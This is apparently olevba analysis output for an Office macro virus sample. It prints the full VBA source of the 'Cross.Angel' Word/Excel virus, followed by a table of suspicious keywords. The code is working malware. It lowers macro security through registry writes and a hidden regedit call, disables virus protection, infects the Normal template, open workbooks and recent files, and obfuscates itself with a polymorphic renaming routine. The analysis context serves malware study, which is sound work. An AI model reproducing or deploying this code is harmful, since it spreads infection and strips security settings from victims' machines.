olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Across-85eac8dec825b08b4bffcc6f197d436418768aa9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Across-85eac8dec825b08b4bffcc6f197d436418768aa9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Cross.Angel
Private Sub Document_Close()
On Error Resume Next
Const ў«ИЁ· = "' Cross.Angel", є ЉЏЕ = 132, Їј±љЌ = "9.0", Лї¶ЄЁ = "Macro", ћБВ • = "Tools", є»‰–ѕ = &H1, є»‰–ѕ_ = &H0, °№Дњ‚ = 0, Л џњ¶ = 1, Ћµѓ”ђ = 12, Кћј‚Ґ = "excel.application", �К·ґЕ = "DieseArbeitsmappe"
Application.EnableCancelKey = (Rnd * °№Дњ‚)
If Application.Version = Їј±љЌ Then
    Application.CommandBars(Лї¶ЄЁ).Controls((Л џњ¶ + Л џњ¶ + Л џњ¶)).Enabled = (Rnd * °№Дњ‚)
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = є»‰–ѕ
Else
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = є»‰–ѕ_
    Application.CommandBars(ћБВ •).Controls(Ћµѓ”ђ).Enabled = (Rnd * °№Дњ‚)
    Options.VirusProtection = (Rnd * °№Дњ‚)
End If
Options.SaveNormalPrompt = (Rnd * °№Дњ‚)
°‡’ѕЇ = ќЖЏ—�(ThisDocument.VBProject.VBComponents(Л џњ¶).CodeModule.Lines(Л џњ¶, є ЉЏЕ))
If MacroContainer = ActiveDocument Then Set Ањ›ЈГ = NormalTemplate Else Set Ањ›ЈГ = ActiveDocument
With Ањ›ЈГ.VBProject.VBComponents(Л џњ¶).CodeModule
    If .Lines(Л џњ¶, Л џњ¶) <> ў«ИЁ· Then
        .DeleteLines Л џњ¶, .CountOfLines
        .InsertLines Л џњ¶, °‡’ѕЇ
        If Ањ›ЈГ = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName
    End If
End With
If System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> Л џњ¶ Then
Set Ў»¬Є¶ = GetObject(, Кћј‚Ґ)
If Ў»¬Є¶ = "" Then Set Ў»¬Є¶ = CreateObject(Кћј‚Ґ): њ¶єЈ– = Л џњ¶
If њ¶єЈ– <> Л џњ¶ Then
    For Each АЕЄ«ў In Ў»¬Є¶.Workbooks
       With АЕЄ«ў.VBProject.VBComponents(�К·ґЕ).CodeModule
            If .Lines(Л џњ¶, Л џњ¶) <> ў«ИЁ· Then
                .DeleteLines Л џњ¶, .CountOfLines
                .InsertLines Л џњ¶, °‡’ѕЇ
                If АЕЄ«ў.Path <> "" Then АЕЄ«ў.Save Else АЕЄ«ў.SaveAs АЕЄ«ў.FullName
            End If
        End With
    Next
Else
    For АЕЄ«ў = Л џњ¶ To Ў»¬Є¶.Application.RecentFiles.Maximum
        Ў»¬Є¶.Application.RecentFiles(АЕЄ«ў).Open
            With Ў»¬Є¶.Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(�К·ґЕ).CodeModule
                If .Lines(Л џњ¶, Л џњ¶) <> ў«ИЁ· Then
                    .DeleteLines Л џњ¶, .CountOfLines
                    .InsertLines Л џњ¶, °‡’ѕЇ
                End If
            End With
        Ў»¬Є¶.Application.Workbooks(Application.RecentFiles(1).Name).Close Л џњ¶
    Next
    Ў»¬Є¶.Quit
End If
System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = Л џњ¶
End If
If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
If System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> Л џњ¶ Then System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = Л џњ¶
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Const ў«ИЁ· = "' Cross.Angel", є ЉЏЕ = 132, Їј±љЌ = "9.0", Лї¶ЄЁ = "Macro", ћБВ • = "Tools", °№Дњ‚ = 0, Л џњ¶ = 1, Ћµѓ”ђ = 10, Кћј‚Ґ = "word.application", �К·ґЕ = "DieseArbeitsmappe"
Application.EnableCancelKey = (Rnd * °№Дњ‚)
If UCase(Dir("c:\.reg")) <> ".REG" Then
Open "c:\.reg" For Output As #1
    Print #1, "REGEDIT4"
If Application.Version = Їј±љЌ Then
    Application.CommandBars(Лї¶ЄЁ).Controls((Л џњ¶ + Л џњ¶ + Л џњ¶)).Enabled = (Rnd * °№Дњ‚)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
    Print #1, """Level""=dword:00000001"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
    Print #1, """Level""=dword:00000001"
Else
    Application.CommandBars(ћБВ •).Controls(Ћµѓ”ђ).Enabled = (Rnd * °№Дњ‚)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
    Print #1, """Options6""=dword:00000000"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]"
    Print #1, """EnableMacroVirusProtection""=""0"""
End If
Close #1
End If
Shell "regedit /s c:\.reg", vbHide
°‡’ѕЇ = ќЖЏ—�(ThisWorkbook.VBProject.VBComponents(�К·ґЕ).CodeModule.Lines(Л џњ¶, є ЉЏЕ))
For Each АЕЄ«ў In Application.Workbooks
    With АЕЄ«ў.VBProject.VBComponents(�К·ґЕ).CodeModule
        If .Lines(Л џњ¶, Л џњ¶) <> ў«ИЁ· Then
            .DeleteLines Л џњ¶, .CountOfLines
            .InsertLines Л џњ¶, °‡’ѕЇ
            If АЕЄ«ў.Path <> "" Then АЕЄ«ў.Save Else АЕЄ«ў.SaveAs АЕЄ«ў.FullName
        End If
    End With
Next
If Application.Workbooks.Count = Л џњ¶ Then
    Application.WindowState = xlMinimized
    For АЕЄ«ў = Л џњ¶ To Application.RecentFiles.Maximum
        Application.RecentFiles(АЕЄ«ў).Open
            With Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(�К·ґЕ).CodeModule
                If .Lines(Л џњ¶, Л џњ¶) <> ў«ИЁ· Then
                    .DeleteLines Л џњ¶, .CountOfLines
                    .InsertLines Л џњ¶, °‡’ѕЇ
                End If
            End With
        Application.Workbooks(Application.RecentFiles(1).Name).Close Л џњ¶
    Next
End If
Set Ў»¬Є¶ = GetObject(, Кћј‚Ґ)
If Ў»¬Є¶ = "" Then Set Ў»¬Є¶ = CreateObject(Кћј‚Ґ): њ¶єЈ– = Л џњ¶
If Ў»¬Є¶.System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> Л џњ¶ Then Ў»¬Є¶.System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = Л џњ¶
If Ў»¬Є¶.System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> Л џњ¶ Then
With Ў»¬Є¶.NormalTemplate.VBProject.VBComponents(Л џњ¶).CodeModule
    If .Lines(Л џњ¶, Л џњ¶) <> ў«ИЁ· Then
        .DeleteLines Л џњ¶, .CountOfLines
        .InsertLines Л џњ¶, °‡’ѕЇ
        Ў»¬Є¶.NormalTemplate.Save
        Ў»¬Є¶.System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = Л џњ¶
    End If
End With
End If
If њ¶єЈ– = Л џњ¶ Then Ў»¬Є¶.Quit Else If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
End Sub
Private Function ќЖЏ—�(°‡’ѕЇ) 'JSMP v1.2
Dim ЈД©®і(0 To 20): Randomize
ЕЄА‚• = 1: ЈД©®і(0) = "°‡’ѕЇ": ЈД©®і(1) = "ќЖЏ—�": ЈД©®і(2) = "ЈД©®і": ЈД©®і(3) = "‹¤’Ѕѓ": ЈД©®і(4) = "Џ’·єІ": ЈД©®і(5) = "ЕЄА‚•": ЈД©®і(6) = "ў«ИЁ·": ЈД©®і(7) = "є ЉЏЕ": ЈД©®і(8) = "Їј±љЌ": ЈД©®і(9) = "Лї¶ЄЁ": ЈД©®і(10) = "ћБВ •": ЈД©®і(11) = "є»‰–ѕ": ЈД©®і(12) = "°№Дњ‚": ЈД©®і(13) = "Л џњ¶": ЈД©®і(14) = "Ћµѓ”ђ": ЈД©®і(15) = "Кћј‚Ґ": ЈД©®і(16) = "�К·ґЕ": ЈД©®і(17) = "Ањ›ЈГ": ЈД©®і(18) = "Ў»¬Є¶": ЈД©®і(19) = "њ¶єЈ–": ЈД©®і(20) = "АЕЄ«ў"
For ‹¤’Ѕѓ = 0 To 20
Џ’·єІ = Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74))
Do
ЕЄА‚• = InStr(ЕЄА‚• + 1, °‡’ѕЇ, ЈД©®і(‹¤’Ѕѓ))
If ЕЄА‚• Then °‡’ѕЇ = Mid(°‡’ѕЇ, 1, (ЕЄА‚• - 1)) & Џ’·єІ & Mid(°‡’ѕЇ, (ЕЄА‚• + Len(ЈД©®і(‹¤’Ѕѓ))), Len(°‡’ѕЇ))
Loop While ЕЄА‚•
Next
ќЖЏ—� = °‡’ѕЇ
End Function
'Cross.Angel written by jackie twoflower /Lz0NT /MVT
'Uses Jackie's Stupid Macro Poly v1.2
'Office97 and Office2000 compatible | New Cross area!
'Hey my angel, this is for you. Why you left me?
'I can't live without you! I luv ya!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

